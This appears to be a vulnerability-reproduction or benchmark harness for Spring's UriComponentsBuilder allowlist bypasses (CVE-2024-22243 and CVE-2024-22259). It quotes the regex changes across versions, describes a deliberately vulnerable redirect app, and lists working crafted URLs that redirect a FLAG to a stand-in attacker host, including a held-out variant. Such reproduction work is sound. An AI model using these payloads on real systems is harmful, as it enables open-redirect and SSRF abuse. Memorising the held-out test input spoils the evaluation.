VERSION MAPPING (ONLY the spring-web JAR differs; Harness.java is byte-identical across the three):
  V0 = spring-web 5.3.31 (pre CVE-2024-22243)         port 42430
  V1 = spring-web 5.3.32 (CVE-2024-22243 fix, TARGET) port 42431   commit 7ec5c994c147 "Update user info pattern"
  V2 = spring-web 5.3.33 (CVE-2024-22259 fix)         port 42432   commit 297cbae2990e "Extract reusable checkSchemeAndPort method"

UriComponentsBuilder regex evolution (verbatim from the tagged sources / fix commit patches):
  V0 5.3.31:  USERINFO_PATTERN = "([^@\[/?#]*)"    HOST_IPV4_PATTERN = "[^\[/?#:]*"
  V1 5.3.32:  USERINFO_PATTERN = "([^@/?#]*)"      HOST_IPV4_PATTERN = "[^\[/?#:]*"   (only "[" removed from userinfo)
  V2 5.3.33:  USERINFO_PATTERN = "([^/?#]*)"       HOST_IPV4_PATTERN = "[^/?#:]*"     ("@" removed from userinfo AND "[" from host)

APP DECISION (faithful vulnerable pattern, per spring.io advisory):
  parse url with UriComponentsBuilder.fromUriString(url).build(); if getHost().equals("trusted.internal")
  -> 302 Location: <url>  else -> 403 blocked. Allowlist host = "trusted.internal"; attacker host = "attacker.test".

--------------------------------------------------------------------------------
INPUT SHAPES
  ORIGINAL (CVE-2024-22243, GIVEN):   url = http://trusted.internal[@attacker.test/?<FLAG>
  RESIDUAL (CVE-2024-22259, HELD-OUT): url = http://@trusted.internal[@attacker.test/?<FLAG>   ("different input", leading @)
  NEGATIVE CONTROL (no trick):         url = http://attacker.test/?<FLAG>

--------------------------------------------------------------------------------
getHost() extracted by the REAL spring-web parser, per version (harness /host endpoint):
                                   V0(5.3.31)        V1(5.3.32)        V2(5.3.33)
  ORIGINAL  http://trusted.internal[@attacker.test  ->  trusted.internal   attacker.test     attacker.test
  RESIDUAL  http://@trusted.internal[@attacker.test ->  trusted.internal   trusted.internal  attacker.test
  (browser / downstream client resolves BOTH to host = attacker.test — everything before the LAST "@" is userinfo)

